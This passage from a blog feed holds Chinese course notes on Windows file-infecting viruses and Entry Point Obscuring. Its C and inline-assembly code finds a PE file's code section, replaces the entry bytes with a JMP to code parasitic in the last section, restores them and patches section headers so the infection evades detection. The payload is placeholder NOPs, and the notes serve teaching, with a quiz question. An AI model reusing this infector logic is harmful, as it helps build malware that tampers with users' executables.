&lt;h3 id=&quot;如何获取api的入口地址&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#如何获取api的入口地址&quot;&gt;&lt;/a&gt; 如何获取API的入口地址&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;找到提供这个API函数的DLL的加载基址&lt;/li&gt;
&lt;li&gt;从DLL的导出表中拿到API函数地址&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>病毒_Win_EPO入口点不在代码节的问题</title>
    <link href="https://wsw8.online/archives/287848c5.html"/>
    <id>https://wsw8.online/archives/287848c5.html</id>
    <published>2021-05-19T01:43:26.000Z</published>
    <updated>2021-05-19T10:05:02.568Z</updated>
    
    <content type="html"><![CDATA[<h2 id="入口点模糊技术"><a class="markdownIt-Anchor" href="#入口点模糊技术"></a> 入口点模糊技术</h2><p>Entry Point Obscuring（EPO）：</p><ol><li>EPO是病毒代码隐藏自己入口点，避免被查杀的一种技术</li><li>EPO使得被病毒修改的入口点看起来依然像是正常的入口点</li></ol><span id="more"></span><h3 id="解决入口点不在代码段问题"><a class="markdownIt-Anchor" href="#解决入口点不在代码段问题"></a> 解决入口点不在代码段问题</h3><ol><li>不感染最后一节，直接感染代码节，病毒代码依附在代码节的尾部，再修改入口点，这样虽然修改了入口点，但是入口点在代码节</li><li>不修改入口点但将入口点所在指令替换成一条JMP指令，跳到寄生的病毒代码</li></ol><h3 id="epo1-感染在代码节的空洞"><a class="markdownIt-Anchor" href="#epo1-感染在代码节的空洞"></a> EPO1 感染在代码节的空洞</h3><h4 id="程序设计"><a class="markdownIt-Anchor" href="#程序设计"></a> 程序设计</h4><p><img src="/images/%E7%97%85%E6%AF%92-Win-EPO%E5%85%A5%E5%8F%A3%E7%82%B9%E4%B8%8D%E5%9C%A8%E4%BB%A3%E7%A0%81%E8%8A%82%E7%9A%84%E9%97%AE%E9%A2%98/image-20210519163430182.png" alt="image-20210519163430182" /></p><h4 id="和之前的不同"><a class="markdownIt-Anchor" href="#和之前的不同"></a> 和之前的不同</h4><blockquote><p>以前是获得最后一个节</p><p>现在是获得第一个代码节</p></blockquote><h4 id="找代码节的方法"><a class="markdownIt-Anchor" href="#找代码节的方法"></a> 找代码节的方法</h4><blockquote><ol><li>遍历所有节表项</li><li>判断节表项的属性里是否有0x00000020属性（代码节）</li></ol></blockquote><h4 id="代码"><a class="markdownIt-Anchor" href="#代码"></a> 代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//遍历所有节表项寻找代码节</span></span><br><span class="line"><span class="keyword">int</span> sectionNum = ntHdrs.FileHeader.NumberOfSections;</span><br><span class="line">IMAGE_SECTION_HEADER infectedSectionHdr;    <span class="comment">//变量，存节表项</span></span><br><span class="line"><span class="keyword">bool</span> found = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; sectionNum; i++)&#123;</span><br><span class="line">  fread(&amp;infectedSectionHdr, <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), <span class="number">1</span>, fp);   <span class="comment">//每次读一个节头</span></span><br><span class="line">  <span class="comment">//通过characteristics字段判断是否为代码节</span></span><br><span class="line">  <span class="keyword">if</span> ((infectedSectionHdr.Characteristics &amp; <span class="number">0x00000020</span>) == <span class="number">0x00000020</span>) </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//判断文件中代码节的空洞是否足够</span></span><br><span class="line">    <span class="keyword">if</span> (infectedSectionHdr.SizeOfRawData - infectedSectionHdr.Misc.VirtualSize &lt;CODE_SIZE)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;the code section has not enough space to save virus\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   found = <span class="literal">true</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!found)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;cannot find code section\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="epo2-感染最后节替换入口指令"><a class="markdownIt-Anchor" href="#epo2-感染最后节替换入口指令"></a> EPO2 感染最后节，替换入口指令</h3><h4 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h4><ol><li>先将原入口5字节保存</li><li>替换成JMP跳到寄生代码</li><li>病毒执行后将入口的5字节还原</li><li>然后跳到原入口</li></ol><h4 id="图示"><a class="markdownIt-Anchor" href="#图示"></a> 图示</h4><p><img src="/images/%E7%97%85%E6%AF%92-Win-EPO%E5%85%A5%E5%8F%A3%E7%82%B9%E4%B8%8D%E5%9C%A8%E4%BB%A3%E7%A0%81%E8%8A%82%E7%9A%84%E9%97%AE%E9%A2%98/image-20210519165604094.png" alt="image-20210519165604094" /></p><h4 id="getcode函数设计"><a class="markdownIt-Anchor" href="#getcode函数设计"></a> getCode函数设计</h4><p><img src="/images/%E7%97%85%E6%AF%92-Win-EPO%E5%85%A5%E5%8F%A3%E7%82%B9%E4%B8%8D%E5%9C%A8%E4%BB%A3%E7%A0%81%E8%8A%82%E7%9A%84%E9%97%AE%E9%A2%98/image-20210519170847754.png" alt="image-20210519170847754" /></p><p>关于最后的数据区</p><blockquote><p>数据区需要保存被覆盖的5个字节</p><p>需要保存数据区起始地址4个字节</p><p>需要保存原程序入口地址4个字节</p><p>共13字节</p></blockquote><p>函数参数</p><blockquote><ol><li>原入口点RVA——AddressOfEntryPoint</li><li>病毒寄生位置RVA——起始RVA+virtualSize</li><li>原程序预期加载地址——ImageBase</li><li>存被覆盖5个字节的字符数组</li><li>代码</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">char</span> * code = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(virusSize);   <span class="comment">//为内嵌汇编分配内存</span></span><br><span class="line"><span class="built_in">memcpy</span>(code, (<span class="keyword">void</span> *)virusStart, virusSize);   <span class="comment">//将内嵌汇编代码拷贝到该内存区域</span></span><br><span class="line"><span class="comment">//由传递的参数计算需要放到寄生病毒数据区的值：预期的病毒数据区内存地址、预期的原入口点</span></span><br><span class="line"><span class="keyword">long</span> expectedVirusDataAddress = imageBase + virusStartRVA + <span class="number">5</span>; <span class="comment">//5为数据区前面的call指令</span></span><br><span class="line"><span class="keyword">long</span> oldEntryAddress = imageBase + oldEntryRVA;</span><br><span class="line"><span class="comment">//定位到寄生病毒代码的数据区</span></span><br><span class="line"><span class="keyword">char</span> * virusData = code + <span class="number">5</span>;</span><br><span class="line">*(<span class="keyword">long</span> *)(virusData + <span class="number">5</span>) = expectedVirusDataAddress;<span class="comment">//写入数据区的第二个数据</span></span><br><span class="line">*(<span class="keyword">long</span> *)(virusData + <span class="number">5</span> + <span class="number">4</span>) = oldEntryAddress;<span class="comment">//写入数据区的第三个数据</span></span><br><span class="line"><span class="comment">//写入被覆盖的5个字节（由函数参数oldEntryBytes获得）到数据区的第一个数据</span></span><br><span class="line">*(<span class="keyword">long</span> *)virusData = *(<span class="keyword">long</span> *)oldEntryBytes;  <span class="comment">//写入前4个字节</span></span><br><span class="line">*(virusData + <span class="number">4</span>) = *(oldEntryBytes + <span class="number">4</span>);<span class="comment">//写入第5个字节</span></span><br><span class="line"><span class="comment">//生成最后的JMP指令</span></span><br><span class="line"><span class="keyword">char</span> * jmpPtr = code + virusSize - <span class="number">5</span>;<span class="comment">//定位到寄生代码中的JMP指令</span></span><br><span class="line">* jmpPtr = <span class="number">0xe9</span>; <span class="comment">//先放JMP指令的机器码</span></span><br><span class="line">jmpPtr++;<span class="comment">//定位到JMP指令的偏移量部分</span></span><br><span class="line">*(<span class="keyword">long</span> *)jmpPtr = oldEntryRVA - (virusStartRVA + virusSize); <span class="comment">//写入JMP指令的偏移量</span></span><br><span class="line"><span class="keyword">return</span> code;</span><br><span class="line">......</span><br></pre></td></tr></table></figure></blockquote><p>关键问题</p><blockquote><p>ImageBase是程序预期的加载基地址，但是win7和vs编译器往往采用了随机地址空间技术，所以我们需要自定位技术</p></blockquote><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">getCode</span><span class="params">( … )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">long</span> virusStart, virusEnd;</span><br><span class="line"><span class="keyword">int</span> virusSize;</span><br><span class="line">_asm&#123;</span><br><span class="line">mov virusStart, offset virus_start; <span class="comment">//获取病毒代码起始偏移</span></span><br><span class="line">mov virusEnd, offset virus_end;   <span class="comment">//获取病毒代码结束偏移</span></span><br><span class="line">&#125;</span><br><span class="line">virusSize = virusEnd - virusStart;  <span class="comment">//获取病毒代码长度</span></span><br><span class="line"><span class="keyword">if</span> (oldEntryBytes == Null)</span><br><span class="line">                      <span class="keyword">return</span> (<span class="keyword">char</span> *)virusSize;</span><br><span class="line"></span><br><span class="line">               …..  <span class="comment">//这部分代码处理内嵌汇编无法处理的部分</span></span><br><span class="line"></span><br><span class="line">virus_start:    <span class="comment">//病毒代码起始标号</span></span><br><span class="line">   _asm&#123;               <span class="comment">//这段嵌入汇编是需要寄生的病毒代码</span></span><br><span class="line">               call yy; <span class="comment">//跳过数据区并且把数据区实际地址压栈</span></span><br><span class="line">data:</span><br><span class="line"><span class="comment">//5字节被覆盖的数据</span></span><br><span class="line">nop;  </span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line"><span class="comment">//预期的数据区地址4字节</span></span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line"><span class="comment">//预期的原入口点地址4字节</span></span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line"></span><br><span class="line">yy:</span><br><span class="line"><span class="comment">//pop eax;  //执行后eax寄存器存放了病毒数据区data的实际地址</span></span><br><span class="line">        jmp xx;<span class="comment">//模拟的有效代码</span></span><br><span class="line">nop;<span class="comment">//病毒行为</span></span><br><span class="line">nop;</span><br><span class="line">xx:</span><br><span class="line">                              <span class="comment">//push ebx;//恢复被覆盖的5个字节 </span></span><br><span class="line">    pop eax;  <span class="comment">//eax为数据区实际地址</span></span><br><span class="line">push ebx;       </span><br><span class="line">push ecx;</span><br><span class="line">mov ebx, eax;         <span class="comment">//eax用来访问实际数据，ebx存实际地址</span></span><br><span class="line">sub ebx, [eax + <span class="number">5</span>];    <span class="comment">//ebx得到加载偏差 = 实际地址 – 预期地址</span></span><br><span class="line">mov ecx, [eax + <span class="number">9</span>];       <span class="comment">//访问数据区得到入口的预期地址</span></span><br><span class="line">add ecx, ebx;            <span class="comment">//获得入口点实际地址</span></span><br><span class="line">;恢复<span class="number">5</span>字节被覆盖的代码</span><br><span class="line"><span class="comment">//恢复入口被覆盖的5个字节内容</span></span><br><span class="line">               <span class="comment">//利用ebx先恢复前4字节</span></span><br><span class="line">mov ebx, [eax];     <span class="comment">//数据区开始的4个字节放入ebx</span></span><br><span class="line">mov [ecx], ebx;     <span class="comment">//ecx是原入口的实际地址，完成前4个字节的恢复</span></span><br><span class="line"><span class="comment">//利用bl再恢复最后一字节</span></span><br><span class="line">mov bl, [eax + <span class="number">4</span>];    </span><br><span class="line">mov byte ptr [ecx + <span class="number">4</span>], bl; </span><br><span class="line">pop ecx</span><br><span class="line">pop ebx;</span><br><span class="line"></span><br><span class="line"><span class="comment">//后5字节最后一条JMP指令的代码占位</span></span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">virus_end:    <span class="comment">//病毒代码结束标号</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="感染代码设计"><a class="markdownIt-Anchor" href="#感染代码设计"></a> 感染代码设计</h3><h4 id="图示-2"><a class="markdownIt-Anchor" href="#图示-2"></a> 图示</h4><p><img src="/images/%E7%97%85%E6%AF%92-Win-EPO%E5%85%A5%E5%8F%A3%E7%82%B9%E4%B8%8D%E5%9C%A8%E4%BB%A3%E7%A0%81%E8%8A%82%E7%9A%84%E9%97%AE%E9%A2%98/image-20210519173947160.png" alt="image-20210519173947160" /></p><p>关键：</p><ol><li>找到入口点所在的节</li><li>将入口点（内存位置）转变为文件位置</li></ol><h4 id="代码-2"><a class="markdownIt-Anchor" href="#代码-2"></a> 代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argC, <span class="keyword">char</span> ** args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">readHdrs(fp);<span class="comment">//读NT头道ntHdrs</span></span><br><span class="line"><span class="keyword">int</span> sectionNum = ntHdrs.FileHeader.NumberOfSections;   <span class="comment">//NT头-文件头-NumberOfSections</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> entry = ntHdrs.OptionalHeader.AddressOfEntryPoint;  <span class="comment">//入口点的值（是RVA）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历节判断入口点在哪个节</span></span><br><span class="line"><span class="comment">//判断条件：当前节的RVA(VirtualAdress)&lt;=入口点&lt;=当前节的RVA+该节的VirtualSize</span></span><br><span class="line">IMAGE_SECTION_HEADER lastSectionHdr, curHdr;  <span class="comment">//两个变量：最后一个节头，当前节头 </span></span><br><span class="line"><span class="keyword">long</span> entryDiskOffset;        <span class="comment">//入口点在文件偏移</span></span><br><span class="line"><span class="keyword">int</span> entryOffsetToSectionStart;  <span class="comment">//入口点在节内偏移</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; sectionNum; i++)</span><br><span class="line">&#123;</span><br><span class="line">    fread(&amp;curHdr, <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), <span class="number">1</span>, fp);</span><br><span class="line">    <span class="comment">//查找入口点所在的节，找到就获得入口点的文件偏移</span></span><br><span class="line">    <span class="keyword">if</span> ((entry &gt;= curHdr.VirtualAddress) &amp;&amp; (entry &lt;= curHdr.VirtualAddress +   </span><br><span class="line">                                                                curHdr.Misc.VirtualSize))</span><br><span class="line">    &#123;</span><br><span class="line">      entryOffsetToSectionStart = entry - curHdr.VirtualAddress; <span class="comment">//注意VirtualAddress为节起始RVA</span></span><br><span class="line">      entryDiskOffset = curHdr.PointerToRawData + entryOffsetToSectionStart;<span class="comment">//获得入口点文件偏移</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//循环结束时，curHdr指向最后一个节头</span></span><br><span class="line">lastSectionHdr = curHdr;</span><br><span class="line"><span class="keyword">int</span> codeSize = (<span class="keyword">int</span>)getCode(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);  <span class="comment">//这里调用了getCode函数的第二种功能</span></span><br><span class="line"><span class="comment">//判断最后一个节是否有空洞寄生</span></span><br><span class="line"><span class="keyword">if</span> (lastSectionHdr.SizeOfRawData - lastSectionHdr.Misc.VirtualSize &lt; codeSize)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the last section has not enough space to save virus\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//此时文件指针正好读完最后一个节头，先改最后一个节的VirtualSize字段，减少文件定位操作</span></span><br><span class="line">fseek(fp, - <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), SEEK_CUR);</span><br><span class="line">fseek(fp, <span class="number">8</span>, SEEK_CUR);<span class="comment">//VirtualSize字段前有8字节的节名</span></span><br><span class="line"><span class="keyword">int</span> newVirtualSize = lastSectionHdr.Misc.VirtualSize + codeSize;</span><br><span class="line">fwrite(&amp;newVirtualSize, <span class="keyword">sizeof</span>(newVirtualSize), <span class="number">1</span>, fp);</span><br><span class="line"><span class="comment">//将原入口点的5个字节（即将被覆盖）保存一下</span></span><br><span class="line"><span class="keyword">char</span> firstCode[<span class="number">5</span>];</span><br><span class="line">fseek(fp, entryDiskOffset, SEEK_SET);  <span class="comment">//定位到入口点的文件位置</span></span><br><span class="line">fread(firstCode, <span class="number">5</span>, <span class="number">1</span>, fp); <span class="comment">//将这5个字节保存到firstCode，后面作为getCode函数的最后一个参数</span></span><br><span class="line"><span class="comment">//在入口点处插入JMP指令，该指令跳到感染的病毒代码处</span></span><br><span class="line"><span class="keyword">char</span> jmpCode[<span class="number">5</span>];</span><br><span class="line">jmpCode[<span class="number">0</span>] = <span class="number">0xe9</span>;</span><br><span class="line"><span class="comment">//跳转目的地址为：感染代码的位置，即最后一个节的VirtualAddress+VirualSize</span></span><br><span class="line"><span class="comment">//跳转的源地址为：JMP指令后面，即AddressOfEntryPoint + 5 （JMP指令长度）</span></span><br><span class="line">*(<span class="keyword">long</span> *)(jmpCode + <span class="number">1</span>) = lastSectionHdr.VirtualAddress + lastSectionHdr.Misc.VirtualSize - (ntHdrs.OptionalHeader.AddressOfEntryPoint + <span class="number">5</span>);</span><br><span class="line">fseek(fp, entryDiskOffset, SEEK_SET); <span class="comment">//定位到入口点的文件位置</span></span><br><span class="line">fwrite(jmpCode, <span class="number">5</span>, <span class="number">1</span>, fp);<span class="comment">//写入这条JMP指令</span></span><br><span class="line"><span class="comment">//传递4个参数给getCode函数，生成病毒寄生代码</span></span><br><span class="line"><span class="keyword">char</span>* code = getCode(ntHdrs.OptionalHeader.AddressOfEntryPoint, </span><br><span class="line">                       lastSectionHdr.VirtualAddress + lastSectionHdr.Misc.VirtualSize,</span><br><span class="line">                       ntHdrs.OptionalHeader.ImageBase, firstCode);</span><br><span class="line"><span class="comment">//写入病毒寄生代码到文件中的最后一个节</span></span><br><span class="line">fseek(fp, lastSectionHdr.PointerToRawData + lastSectionHdr.Misc.VirtualSize, SEEK_SET);</span><br><span class="line">fwrite(code, codeSize, <span class="number">1</span>, fp);    </span><br><span class="line"><span class="built_in">free</span>(code);</span><br><span class="line"></span><br><span class="line"> <span class="comment">//修改ImageSize</span></span><br><span class="line">locateNTHdrStart(fp);</span><br><span class="line"><span class="keyword">int</span> offsetImageSize = (<span class="keyword">int</span>)&amp;((IMAGE_NT_HEADERS *)<span class="number">0</span> )-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line"></span><br><span class="line">fseek(fp, offsetImageSize, SEEK_CUR);</span><br><span class="line"><span class="keyword">int</span> accurateSize = (lastSectionHdr.VirtualAddress + lastSectionHdr.Misc.VirtualSize + codeSize);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pageNum = accurateSize  / ntHdrs.OptionalHeader.SectionAlignment;</span><br><span class="line"><span class="keyword">int</span> imageSize = (pageNum) * ntHdrs.OptionalHeader.SectionAlignment &lt; accurateSize ? (pageNum + <span class="number">1</span>) * ntHdrs.OptionalHeader.SectionAlignment : accurateSize;<span class="comment">//取上整</span></span><br><span class="line"></span><br><span class="line">fwrite(&amp;imageSize, <span class="keyword">sizeof</span>(imageSize), <span class="number">1</span>, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h3><ol><li>关于寄生在Windows文件中的病毒数据区，下列说法不正确的是（       ）<br />A. 尽管PE文件本身提供了重定位机制，但访问病毒数据区还是需要自定位<br />B. 病毒数据区在寄生前，往往需要感染时借助病毒main函数传递的参数来进行数据填写<br />C. 病毒数据区的预期加载地址需要借助PE文件的相关字段信息计算出来<br />D. 病毒数据区的预期加载地址也可以通过内嵌汇编标号的方式获得</li></ol><p>参考答案：D</p><p>解析：病毒数据区的预期加载地址只能算出来，不能通过内嵌汇编标号的方式获得</p><h3 id="为入口点所在节增加内存可写属性"><a class="markdownIt-Anchor" href="#为入口点所在节增加内存可写属性"></a> 为入口点所在节增加内存可写属性</h3><ol><li>循环搜索入口点所在的节</li><li>找到后保存该节的索引和属性字段</li><li>然后在文件中定位到该节的节头，计算新的属性值并写入到节头的属性字段</li></ol><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> entrySectionIndex;  <span class="comment">//变量 - 存入口点所在节的索引</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> characteristic;   <span class="comment">//变量 - 存入口点所在节的属性</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; sectionNum; i++)</span><br><span class="line">&#123;</span><br><span class="line">    fread(&amp;curHdr, <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), <span class="number">1</span>, fp);</span><br><span class="line">    <span class="comment">//找到入口点所在的节</span></span><br><span class="line">    <span class="keyword">if</span> ((entry &gt;= curHdr.VirtualAddress) &amp;&amp; </span><br><span class="line">         (entry &lt;= curHdr.VirtualAddress + curHdr.Misc.VirtualSize))</span><br><span class="line">    &#123;</span><br><span class="line">        entryOffsetToSectionStart = entry - curHdr.VirtualAddress;</span><br><span class="line">        entryDiskOffset = curHdr.PointerToRawData + entryOffsetToSectionStart;</span><br><span class="line">        entrySectionIndex = i; <span class="comment">//记录入口点所在节的索引值</span></span><br><span class="line">        characteristic = curHdr.Characteristics;  <span class="comment">//保存入口点所在节的原属性值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改入口点所在代码节的属性，添加可写属性80000000h</span></span><br><span class="line"><span class="comment">//先在文件中定位到节表的位置，节表在NT头的后面</span></span><br><span class="line">locateNTHdrStart(fp);   <span class="comment">//在文件中定位到NT头的位置</span></span><br><span class="line">fseek(fp, <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS), SEEK_CUR);  <span class="comment">//移动NT头长度，定位节表</span></span><br><span class="line"><span class="comment">//所在节的节头位置为：该节索引*每个节头长度</span></span><br><span class="line"><span class="comment">//获得属性字段离该节节头的偏移</span></span><br><span class="line"><span class="keyword">int</span> offsetCha = (<span class="keyword">int</span>)&amp;(((IMAGE_SECTION_HEADER *)<span class="number">0</span>)-&gt;Characteristics);</span><br><span class="line"><span class="comment">//定位属性字段的文件位置：节头位置+属性字段离节头的偏移</span></span><br><span class="line">fseek(fp, (entrySectionIndex * <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER)) + offsetCha, SEEK_CUR);</span><br><span class="line"><span class="comment">//计算新的属性值</span></span><br><span class="line">characteristic = characteristic | <span class="number">0x80000000</span>;</span><br><span class="line"><span class="comment">//文件中写入新的属性值</span></span><br><span class="line">fwrite(&amp;characteristic, <span class="number">4</span>, <span class="number">1</span>, fp);</span><br><span class="line">fclose(fp);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;入口点模糊技术&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#入口点模糊技术&quot;&gt;&lt;/a&gt; 入口点模糊技术&lt;/h2&gt;
&lt;p&gt;Entry Point Obscuring（EPO）：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;EPO是病毒代码隐藏自己入口点，避免被查杀的一种技术&lt;/li&gt;
&lt;li&gt;EPO使得被病毒修改的入口点看起来依然像是正常的入口点&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>病毒_Win_末节寄生程序设计</title>
    <link href="https://wsw8.online/archives/3ac768f6.html"/>
    <id>https://wsw8.online/archives/3ac768f6.html</id>
    <published>2021-05-19T01:14:44.000Z</published>
    <updated>2021-05-19T01:42:24.834Z</updated>
    
